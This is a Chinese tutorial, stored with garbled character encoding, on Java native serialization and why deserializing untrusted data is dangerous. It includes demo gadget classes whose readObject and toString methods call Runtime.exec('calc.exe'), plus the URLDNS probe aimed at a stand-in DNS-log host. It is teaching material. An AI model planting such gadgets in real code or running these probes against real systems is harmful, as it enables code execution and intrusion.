# JavaEEåº”ç”¨å¼€å‘ä¸å®‰å…¨ï¼šç¬¬35å¤© - JavaåŸç”Ÿååºåˆ—åŒ–å…¥é—¨ä¸å®‰å…¨åˆ†æ ğŸ”

![](img/8e001ed0233ce08a104ed89af096e536_1.png)

![](img/8e001ed0233ce08a104ed89af096e536_3.png)

![](img/8e001ed0233ce08a104ed89af096e536_5.png)

åœ¨æœ¬èŠ‚è¯¾ä¸­ï¼Œæˆ‘ä»¬å°†è¦å­¦ä¹ Javaä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–æŠ€æœ¯ã€‚è¿™æ˜¯Javaå®‰å…¨é¢†åŸŸçš„æ ¸å¿ƒéƒ¨åˆ†ï¼Œè®¸å¤šæ¼æ´éƒ½æºäºæ­¤ã€‚æˆ‘ä»¬å°†ä»åŸºç¡€æ¦‚å¿µå…¥æ‰‹ï¼Œé€šè¿‡ä»£ç å®è·µï¼Œåˆ†æå…¶å·¥ä½œåŸç†ï¼Œå¹¶åˆæ­¥æ¢è®¨å…¶å¯èƒ½å¼•å‘çš„å®‰å…¨é—®é¢˜ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_7.png)

![](img/8e001ed0233ce08a104ed89af096e536_9.png)

![](img/8e001ed0233ce08a104ed89af096e536_11.png)

![](img/8e001ed0233ce08a104ed89af096e536_13.png)

## æ¦‚è¿°ï¼šä»€ä¹ˆæ˜¯åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ï¼Ÿ ğŸ”„

![](img/8e001ed0233ce08a104ed89af096e536_15.png)

![](img/8e001ed0233ce08a104ed89af096e536_17.png)

åºåˆ—åŒ–æ˜¯ä¸€ç§å°†å†…å­˜ä¸­çš„å¯¹è±¡çŠ¶æ€è½¬æ¢ä¸ºå­—èŠ‚æµçš„æŠ€æœ¯ã€‚ååºåˆ—åŒ–åˆ™æ˜¯å…¶é€†è¿‡ç¨‹ï¼Œå°†å­—èŠ‚æµæ¢å¤ä¸ºå†…å­˜ä¸­çš„å¯¹è±¡ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_19.png)

![](img/8e001ed0233ce08a104ed89af096e536_21.png)

**æ ¸å¿ƒå…¬å¼**ï¼š
*   **åºåˆ—åŒ–**ï¼š`Object` â†’ `Byte Stream`
*   **ååºåˆ—åŒ–**ï¼š`Byte Stream` â†’ `Object`

è¿™é¡¹æŠ€æœ¯ä¸»è¦ç”¨äºæ•°æ®ä¼ è¾“å’ŒæŒä¹…åŒ–å­˜å‚¨ã€‚å½“éœ€è¦é€šè¿‡ç½‘ç»œä¼ è¾“ä¸€ä¸ªå¤æ‚çš„å¯¹è±¡ï¼Œæˆ–å°†å…¶ä¿å­˜åˆ°æ–‡ä»¶ã€æ•°æ®åº“æ—¶ï¼Œç›´æ¥ä¼ è¾“å¯¹è±¡æœ¬èº«ï¼ˆåŒ…å«å…¶æ–¹æ³•ã€å†…éƒ¨ç»“æ„ç­‰ï¼‰éå¸¸å›°éš¾ã€‚åºåˆ—åŒ–æŠ€æœ¯å°†å¯¹è±¡â€œæ‰“åŒ…â€æˆä¸€ä¸ªç´§å‡‘çš„å­—èŠ‚æµï¼Œä¾¿äºä¼ è¾“å’Œå­˜å‚¨ï¼›æ¥æ”¶æ–¹å†é€šè¿‡ååºåˆ—åŒ–â€œæ‹†åŒ…â€ï¼Œè¿˜åŸå‡ºåŸå§‹å¯¹è±¡ã€‚

ä¸Šä¸€èŠ‚æˆ‘ä»¬ä»‹ç»äº†Javaçš„åå°„æœºåˆ¶ï¼Œæœ¬èŠ‚ä¸­æˆ‘ä»¬æ¥çœ‹çœ‹ä¸åå°„æœºåˆ¶ç´§å¯†ç›¸å…³çš„åºåˆ—åŒ–æ“ä½œã€‚

![](img/8e001ed0233ce08a104ed89af096e536_23.png)

## ç¬¬ä¸€éƒ¨åˆ†ï¼šJavaåŸç”Ÿåºåˆ—åŒ–ä¸ååºåˆ—åŒ–å®è·µ ğŸ’»

![](img/8e001ed0233ce08a104ed89af096e536_25.png)

æˆ‘ä»¬å°†é€šè¿‡ä»£ç æ¼”ç¤ºå¦‚ä½•ä½¿ç”¨Javaå†…ç½®çš„APIè¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œã€‚

### 1. åˆ›å»ºå¯åºåˆ—åŒ–çš„å¯¹è±¡ç±»

é¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ªå®ç°äº† `Serializable` æ¥å£çš„ç±»ã€‚è¿™ä¸ªæ¥å£æ˜¯ä¸€ä¸ªæ ‡è®°æ¥å£ï¼Œè¡¨æ˜è¯¥ç±»çš„å¯¹è±¡å¯ä»¥è¢«åºåˆ—åŒ–ã€‚

```java
import java.io.Serializable;

public class UserDemo implements Serializable {
    // æˆå‘˜å˜é‡
    private String name = "å°æ";
    private String gender = "ç”·";
    private int age = 30;

    // æ„é€ æ–¹æ³•
    public UserDemo() {}
    public UserDemo(String name, String gender, int age) {
        this.name = name;
        this.gender = gender;
        this.age = age;
    }

    // é‡å†™toStringæ–¹æ³•ï¼Œä¾¿äºè¾“å‡ºå¯¹è±¡ä¿¡æ¯
    @Override
    public String toString() {
        return "UserDemo{name='" + name + "', gender='" + gender + "', age=" + age + "}";
    }
}
```

### 2. åºåˆ—åŒ–æ“ä½œï¼šå°†å¯¹è±¡å†™å…¥æ–‡ä»¶

ä»¥ä¸‹æ˜¯è¿›è¡Œåºåˆ—åŒ–æ“ä½œçš„ä»£ç ï¼Œå…¶æ ¸å¿ƒæ˜¯ä½¿ç”¨ `ObjectOutputStream` å°†å¯¹è±¡å†™å…¥æ–‡ä»¶ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_27.png)

![](img/8e001ed0233ce08a104ed89af096e536_29.png)

```java
import java.io.FileOutputStream;
import java.io.ObjectOutputStream;

![](img/8e001ed0233ce08a104ed89af096e536_31.png)

![](img/8e001ed0233ce08a104ed89af096e536_33.png)

![](img/8e001ed0233ce08a104ed89af096e536_35.png)

![](img/8e001ed0233ce08a104ed89af096e536_37.png)

![](img/8e001ed0233ce08a104ed89af096e536_39.png)

![](img/8e001ed0233ce08a104ed89af096e536_41.png)

public class SerializeTest {
    // åºåˆ—åŒ–æ–¹æ³•
    public static void serializeObject(Object obj, String fileName) throws Exception {
        FileOutputStream fileOut = new FileOutputStream(fileName);
        ObjectOutputStream out = new ObjectOutputStream(fileOut);
        out.writeObject(obj); // å…³é”®æ­¥éª¤ï¼šå°†å¯¹è±¡åºåˆ—åŒ–å¹¶å†™å…¥æ–‡ä»¶
        out.close();
        fileOut.close();
        System.out.println("åºåˆ—åŒ–æ•°æ®å·²ä¿å­˜åˆ°: " + fileName);
    }

    public static void main(String[] args) {
        try {
            // åˆ›å»ºä¸€ä¸ªUserDemoå¯¹è±¡
            UserDemo user = new UserDemo("å°è¿ªSEC", "ç”·", 31);
            System.out.println("åºåˆ—åŒ–å‰çš„å¯¹è±¡: " + user);
            // è°ƒç”¨åºåˆ—åŒ–æ–¹æ³•
            serializeObject(user, "ser.txt");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
è¿è¡Œæ­¤ä»£ç åï¼Œä¼šåœ¨é¡¹ç›®ç›®å½•ä¸‹ç”Ÿæˆä¸€ä¸ª `ser.txt` æ–‡ä»¶ã€‚ç”¨æ–‡æœ¬ç¼–è¾‘å™¨æ‰“å¼€ä¼šçœ‹åˆ°ä¹±ç ï¼Œå› ä¸ºå®ƒæ˜¯å¯¹è±¡çš„äºŒè¿›åˆ¶å­—èŠ‚æµè¡¨ç¤ºã€‚

![](img/8e001ed0233ce08a104ed89af096e536_43.png)

![](img/8e001ed0233ce08a104ed89af096e536_45.png)

### 3. ååºåˆ—åŒ–æ“ä½œï¼šä»æ–‡ä»¶è¯»å–å¯¹è±¡

![](img/8e001ed0233ce08a104ed89af096e536_47.png)

![](img/8e001ed0233ce08a104ed89af096e536_48.png)

ä»¥ä¸‹æ˜¯è¿›è¡Œååºåˆ—åŒ–æ“ä½œçš„ä»£ç ï¼Œå…¶æ ¸å¿ƒæ˜¯ä½¿ç”¨ `ObjectInputStream` ä»æ–‡ä»¶ä¸­è¯»å–å¹¶è¿˜åŸå¯¹è±¡ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_50.png)

![](img/8e001ed0233ce08a104ed89af096e536_52.png)

![](img/8e001ed0233ce08a104ed89af096e536_54.png)

![](img/8e001ed0233ce08a104ed89af096e536_56.png)

```java
import java.io.FileInputStream;
import java.io.ObjectInputStream;

public class UnserializeTest {
    // ååºåˆ—åŒ–æ–¹æ³•
    public static Object unserializeObject(String fileName) throws Exception {
        FileInputStream fileIn = new FileInputStream(fileName);
        ObjectInputStream in = new ObjectInputStream(fileIn);
        Object obj = in.readObject(); // å…³é”®æ­¥éª¤ï¼šä»æ–‡ä»¶è¯»å–å¹¶ååºåˆ—åŒ–ä¸ºå¯¹è±¡
        in.close();
        fileIn.close();
        return obj;
    }

    public static void main(String[] args) {
        try {
            // è°ƒç”¨ååºåˆ—åŒ–æ–¹æ³•ï¼Œè¯»å– ser.txt æ–‡ä»¶
            Object obj = unserializeObject("ser.txt");
            // è¾“å‡ºè¿˜åŸåçš„å¯¹è±¡
            System.out.println("ååºåˆ—åŒ–åçš„å¯¹è±¡: " + obj);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
è¿è¡Œæ­¤ä»£ç ï¼Œæ§åˆ¶å°ä¼šè¾“å‡ºä¸åºåˆ—åŒ–å‰å†…å®¹ä¸€è‡´çš„å¯¹è±¡ä¿¡æ¯ï¼Œè¯æ˜ååºåˆ—åŒ–æˆåŠŸã€‚

é€šè¿‡ä»¥ä¸Šå®è·µï¼Œæˆ‘ä»¬äº†è§£äº†åºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„åŸºæœ¬æµç¨‹ï¼š**å°†å¯¹è±¡å°è£…æˆæ–‡ä»¶ä¾¿äºä¼ è¾“ï¼Œæ¥æ”¶æ–¹å†å°†æ–‡ä»¶è§£æè¿˜åŸ**ã€‚

## ç¬¬äºŒéƒ¨åˆ†ï¼šååºåˆ—åŒ–å®‰å…¨é—®é¢˜åˆæ¢ âš ï¸

![](img/8e001ed0233ce08a104ed89af096e536_58.png)

![](img/8e001ed0233ce08a104ed89af096e536_60.png)

![](img/8e001ed0233ce08a104ed89af096e536_62.png)

![](img/8e001ed0233ce08a104ed89af096e536_64.png)

ç†è§£äº†åŸºæœ¬æ“ä½œåï¼Œæˆ‘ä»¬æ¥çœ‹ååºåˆ—åŒ–ä¸ºä½•ä¼šæˆä¸ºå®‰å…¨æ¼æ´çš„é‡ç¾åŒºã€‚å…¶æ ¹æœ¬åŸå› åœ¨äºï¼š**ååºåˆ—åŒ–è¿‡ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡ä¸­çš„ç‰¹å®šæ–¹æ³•**ã€‚å¦‚æœè¿™äº›æ–¹æ³•è¢«æ¶æ„æ„é€ ï¼Œå°±ä¼šæ‰§è¡Œå±é™©ä»£ç ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_66.png)

![](img/8e001ed0233ce08a104ed89af096e536_68.png)

### å®‰å…¨é—®é¢˜æˆå› åˆ†æ

![](img/8e001ed0233ce08a104ed89af096e536_70.png)

![](img/8e001ed0233ce08a104ed89af096e536_72.png)

ååºåˆ—åŒ–çš„å®‰å…¨éšæ‚£ä¸»è¦æºäºä»¥ä¸‹å‡ ä¸ªè§¦å‘ç‚¹ï¼š

#### 1. é‡å†™ `readObject` æ–¹æ³•

![](img/8e001ed0233ce08a104ed89af096e536_74.png)

![](img/8e001ed0233ce08a104ed89af096e536_76.png)

å¦‚æœè¢«åºåˆ—åŒ–çš„ç±»é‡å†™äº† `readObject()` æ–¹æ³•ï¼Œé‚£ä¹ˆåœ¨ååºåˆ—åŒ–æ—¶ï¼ŒJVMä¼šè°ƒç”¨è¿™ä¸ªé‡å†™çš„æ–¹æ³•ï¼Œè€Œä¸æ˜¯é»˜è®¤çš„ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_78.png)

![](img/8e001ed0233ce08a104ed89af096e536_80.png)

![](img/8e001ed0233ce08a104ed89af096e536_82.png)

```java
import java.io.IOException;
import java.io.Serializable;

![](img/8e001ed0233ce08a104ed89af096e536_84.png)

public class EvilUserDemo implements Serializable {
    private String name;

    // æ¶æ„é‡å†™çš„ readObject æ–¹æ³•
    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
        // å…ˆè°ƒç”¨é»˜è®¤çš„ååºåˆ—åŒ–é€»è¾‘ä»¥æ­£ç¡®è¿˜åŸæ•°æ®
        in.defaultReadObject();
        // ç„¶åæ‰§è¡Œæ¶æ„ä»£ç 
        Runtime.getRuntime().exec("calc.exe"); // åœ¨Windowsä¸Šå¼¹å‡ºè®¡ç®—å™¨
    }
}
```
**æ”»å‡»é“¾æ¡**ï¼š
1.  æ”»å‡»è€…åºåˆ—åŒ–ä¸€ä¸ª `EvilUserDemo` å¯¹è±¡ã€‚
2.  å½“å—å®³è€…ç¨‹åºå¯¹è¿™ä¸ªåºåˆ—åŒ–æ•°æ®ï¼ˆå¦‚ `ser.txt`ï¼‰è¿›è¡Œååºåˆ—åŒ–æ—¶ã€‚
3.  ç¨‹åºä¼šæ‰§è¡Œ `EvilUserDemo.readObject()` æ–¹æ³•ï¼Œä»è€Œè§¦å‘å‘½ä»¤æ‰§è¡Œã€‚

![](img/8e001ed0233ce08a104ed89af096e536_86.png)

![](img/8e001ed0233ce08a104ed89af096e536_88.png)

è¿™ç§æ˜¯æœ€ç›´æ¥çš„æ–¹å¼ï¼Œä½†åœ¨å®é™…æ¼æ´ä¸­è¾ƒå°‘è§ï¼Œå› ä¸ºå¾ˆå°‘æœ‰ç¨‹åºä¼šç›´æ¥ååºåˆ—åŒ–ä¸€ä¸ªæ˜æ˜¾åŒ…å«æ¶æ„æ–¹æ³•çš„è‡ªå®šä¹‰ç±»ã€‚

#### 2. åˆ©ç”¨ç±»çš„å…¶ä»–â€œé­”æœ¯æ–¹æ³•â€

![](img/8e001ed0233ce08a104ed89af096e536_90.png)

![](img/8e001ed0233ce08a104ed89af096e536_92.png)

![](img/8e001ed0233ce08a104ed89af096e536_94.png)

![](img/8e001ed0233ce08a104ed89af096e536_95.png)

é™¤äº† `readObject`ï¼ŒJavaä¸­è¿˜æœ‰ä¸€äº›æ–¹æ³•ä¼šåœ¨ç‰¹å®šåœºæ™¯ä¸‹è¢«è‡ªåŠ¨è°ƒç”¨ï¼Œç±»ä¼¼äºPHPä¸­çš„é­”æœ¯æ–¹æ³•ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_97.png)

![](img/8e001ed0233ce08a104ed89af096e536_99.png)

![](img/8e001ed0233ce08a104ed89af096e536_101.png)

![](img/8e001ed0233ce08a104ed89af096e536_103.png)

*   **`toString()` æ–¹æ³•**ï¼šå½“å¯¹è±¡è¢«å½“ä½œå­—ç¬¦ä¸²è¾“å‡ºï¼ˆå¦‚ `System.out.println(obj)`ï¼‰æ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨å…¶ `toString()` æ–¹æ³•ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_105.png)

![](img/8e001ed0233ce08a104ed89af096e536_107.png)

![](img/8e001ed0233ce08a104ed89af096e536_109.png)

![](img/8e001ed0233ce08a104ed89af096e536_111.png)

![](img/8e001ed0233ce08a104ed89af096e536_113.png)

```java
public class EvilUserDemo2 implements Serializable {
    @Override
    public String toString() {
        // å½“ååºåˆ—åŒ–åï¼Œå¦‚æœå¯¹è¯¥å¯¹è±¡è¿›è¡Œè¾“å‡ºæ“ä½œï¼Œå°±ä¼šè§¦å‘
        Runtime.getRuntime().exec("calc.exe");
        return super.toString();
    }
}
```
åœ¨ååºåˆ—åŒ–ä»£ç ä¸­ï¼Œå¦‚æœå­˜åœ¨ `System.out.println(unserializeObject("ser.txt"));` è¿™æ ·çš„è¾“å‡ºè¯­å¥ï¼Œå°±ä¼šè§¦å‘ `toString()` ä¸­çš„æ¶æ„ä»£ç ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_115.png)

![](img/8e001ed0233ce08a104ed89af096e536_116.png)

![](img/8e001ed0233ce08a104ed89af096e536_118.png)

![](img/8e001ed0233ce08a104ed89af096e536_120.png)

![](img/8e001ed0233ce08a104ed89af096e536_122.png)

![](img/8e001ed0233ce08a104ed89af096e536_124.png)

#### 3. åˆ©ç”¨Javaè‡ªèº«ç±»åº“ä¸­çš„å±é™©æ–¹æ³•ï¼ˆå¸¸è§çœŸå®æ¼æ´ï¼‰

![](img/8e001ed0233ce08a104ed89af096e536_126.png)

![](img/8e001ed0233ce08a104ed89af096e536_128.png)

![](img/8e001ed0233ce08a104ed89af096e536_130.png)

è¿™æ˜¯å®é™…ä¸­æœ€å¸¸è§çš„ååºåˆ—åŒ–æ¼æ´ç±»å‹ã€‚æ”»å‡»è€…åˆ©ç”¨çš„æ˜¯Javaæ ‡å‡†åº“æˆ–ç¬¬ä¸‰æ–¹ç»„ä»¶ä¸­ï¼Œé‚£äº›æœ¬èº«å¯åºåˆ—åŒ–ã€å¹¶ä¸”åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨æŸäº›å±é™©æ–¹æ³•çš„ç±»ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_132.png)

![](img/8e001ed0233ce08a104ed89af096e536_134.png)

![](img/8e001ed0233ce08a104ed89af096e536_136.png)

![](img/8e001ed0233ce08a104ed89af096e536_138.png)

![](img/8e001ed0233ce08a104ed89af096e536_140.png)

ä¾‹å¦‚ï¼Œä¸€ä¸ªç»å…¸çš„æµ‹è¯•ç”¨ä¾‹æ˜¯åˆ©ç”¨ `java.util.HashMap` å’Œ `java.net.URL` ç±»ï¼š

![](img/8e001ed0233ce08a104ed89af096e536_142.png)

![](img/8e001ed0233ce08a104ed89af096e536_144.png)

```java
import java.io.*;
import java.net.URL;
import java.util.HashMap;

![](img/8e001ed0233ce08a104ed89af096e536_146.png)

![](img/8e001ed0233ce08a104ed89af096e536_148.png)

public class URLDNS {
    public static void main(String[] args) throws Exception {
        HashMap<URL, Integer> hashMap = new HashMap<>();
        // è®¾ç½®ä¸€ä¸ªä¼šè¢«è§£æçš„URL
        URL url = new URL("http://your-dns-log.com");
        hashMap.put(url, 1);

        // åºåˆ—åŒ–è¿™ä¸ªHashMap
        serializeObject(hashMap, "dns.txt");
        // ååºåˆ—åŒ–å®ƒ
        unserializeObject("dns.txt");
    }
    // ... ä½¿ç”¨ä¹‹å‰å®šä¹‰çš„åºåˆ—åŒ–/ååºåˆ—åŒ–æ–¹æ³•
}
```
**æ”»å‡»é“¾æ¡åˆ†æ**ï¼š
1.  `HashMap` å®ç°äº† `Serializable`ã€‚
2.  å½“ `HashMap` ååºåˆ—åŒ–æ—¶ï¼Œå…¶ `readObject()` æ–¹æ³•ä¼šè°ƒç”¨ `hashCode()` æ¥è®¡ç®—é”®ï¼ˆKeyï¼‰çš„å“ˆå¸Œå€¼ã€‚
3.  å¦‚æœé”®æ˜¯ `java.net.URL` å¯¹è±¡ï¼Œè®¡ç®—å…¶ `hashCode()` ä¼šè§¦å‘ `InetAddress.getByName(host)` æ“ä½œï¼Œå³å¯¹URLä¸­çš„ä¸»æœºåè¿›è¡Œä¸€æ¬¡DNSè§£æã€‚
4.  æ”»å‡»è€…å¯ä»¥æ§åˆ¶URLåœ°å€ï¼ŒæŒ‡å‘ä¸€ä¸ªè‡ªå·±æ­å»ºçš„DNSæ—¥å¿—æœåŠ¡å™¨ã€‚ä¸€æ—¦æ¼æ´è§¦å‘ï¼Œå°±èƒ½æ”¶åˆ°DNSæŸ¥è¯¢è®°å½•ï¼Œä»è€Œè¯å®ååºåˆ—åŒ–æ¼æ´å­˜åœ¨ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_150.png)

![](img/8e001ed0233ce08a104ed89af096e536_152.png)

è¿™ä¸ªä¾‹å­ï¼ˆURLDNSï¼‰å¸¸è¢«ç”¨ä½œååºåˆ—åŒ–æ¼æ´çš„â€œæ¢é’ˆâ€ï¼Œå› ä¸ºå®ƒä¸æ‰§è¡Œå‘½ä»¤ï¼Œåªäº§ç”ŸDNSæµé‡ï¼Œç›¸å¯¹æ— å®³ä¸”æ˜“äºæ£€æµ‹ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_154.png)

![](img/8e001ed0233ce08a104ed89af096e536_156.png)

![](img/8e001ed0233ce08a104ed89af096e536_158.png)

![](img/8e001ed0233ce08a104ed89af096e536_160.png)

**æ ¸å¿ƒæ¦‚å¿µæ€»ç»“**ï¼šååºåˆ—åŒ–æ¼æ´çš„åˆ©ç”¨ï¼Œå…³é”®åœ¨äºæ‰¾åˆ°ä¸€æ¡ä»ååºåˆ—åŒ–å…¥å£ï¼ˆå¦‚ `ObjectInputStream.readObject()`ï¼‰åˆ°æœ€ç»ˆå±é™©æ“ä½œï¼ˆå¦‚å‘½ä»¤æ‰§è¡Œã€æ–‡ä»¶è¯»å†™ã€ç½‘ç»œè¯·æ±‚ï¼‰çš„**è°ƒç”¨é“¾æ¡**ï¼ˆGadget Chainï¼‰ã€‚è¿™æ¡é“¾æ¡é€šå¸¸ç”±å¤šä¸ªç±»çš„æ–¹æ³•ä¾æ¬¡è°ƒç”¨ç»„æˆã€‚

![](img/8e001ed0233ce08a104ed89af096e536_162.png)

![](img/8e001ed0233ce08a104ed89af096e536_164.png)

## æ€»ç»“ä¸å±•æœ› ğŸ¯

![](img/8e001ed0233ce08a104ed89af096e536_166.png)

æœ¬èŠ‚è¯¾ä¸­æˆ‘ä»¬ä¸€èµ·å­¦ä¹ äº†JavaåŸç”Ÿåºåˆ—åŒ–ä¸ååºåˆ—åŒ–çš„åŸºç¡€æ“ä½œï¼Œå¹¶åˆæ­¥æ¢è®¨äº†å…¶å®‰å…¨é—®é¢˜çš„æ ¸å¿ƒåŸç†ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_168.png)

*   **åºåˆ—åŒ–**æ˜¯å°†å¯¹è±¡è½¬ä¸ºå­—èŠ‚æµï¼Œä¾¿äºä¼ è¾“æˆ–å­˜å‚¨ã€‚
*   **ååºåˆ—åŒ–**æ˜¯å°†å­—èŠ‚æµè¿˜åŸä¸ºå¯¹è±¡ã€‚
*   **å®‰å…¨é£é™©**æºäºååºåˆ—åŒ–è¿‡ç¨‹ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡ç±»ä¸­çš„æ–¹æ³•ï¼ˆå¦‚ `readObject`, `toString`ï¼‰ã€‚å¦‚æœè¿™äº›æ–¹æ³•è¢«æ¶æ„é‡å†™ï¼Œæˆ–åˆ©ç”¨äº†Javaç±»åº“ä¸­å·²æœ‰çš„å±é™©æ–¹æ³•é“¾ï¼Œå°±å¯èƒ½æ‰§è¡Œä»»æ„ä»£ç ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_170.png)

ååºåˆ—åŒ–æ˜¯ä¸€ä¸ªåºå¤§ä¸”å¤æ‚çš„è¯é¢˜ï¼Œä»Šå¤©åªæ˜¯å…¥é—¨ã€‚åç»­åœ¨æ¼æ´åˆ†æç¯‡ç« ä¸­ï¼Œæˆ‘ä»¬ä¼šæ·±å…¥è®²è§£ï¼š
*   å¦‚ä½•åˆ†æå¤æ‚çš„åˆ©ç”¨é“¾æ¡ï¼ˆå¦‚Commons Collections, Fastjsonç­‰ï¼‰ã€‚
*   ä¸åŒç»„ä»¶ï¼ˆå¦‚XML, JSONè§£æå™¨ï¼‰çš„ååºåˆ—åŒ–å·®å¼‚ã€‚
*   é«˜é˜¶åˆ©ç”¨æŠ€æœ¯ï¼Œå¦‚RMIã€JNDIæ³¨å…¥ç­‰ã€‚

![](img/8e001ed0233ce08a104ed89af096e536_172.png)

![](img/8e001ed0233ce08a104ed89af096e536_174.png)

![](img/8e001ed0233ce08a104ed89af096e536_176.png)

![](img/8e001ed0233ce08a104ed89af096e536_178.png)

ç†è§£è¿™äº›åº•å±‚åŸç†ï¼Œå°†ä¸ºæˆ‘ä»¬åç»­åˆ†æçœŸå®ä¸–ç•Œçš„Javaååºåˆ—åŒ–æ¼æ´æ‰“ä¸‹åšå®çš„åŸºç¡€ã€‚ä¸‹èŠ‚è¯¾ï¼Œæˆ‘ä»¬å°†è¿›å…¥JWTï¼ˆJSON Web Tokenï¼‰ä¸èº«ä»½éªŒè¯ç›¸å…³çš„å®‰å…¨ä¸»é¢˜ã€‚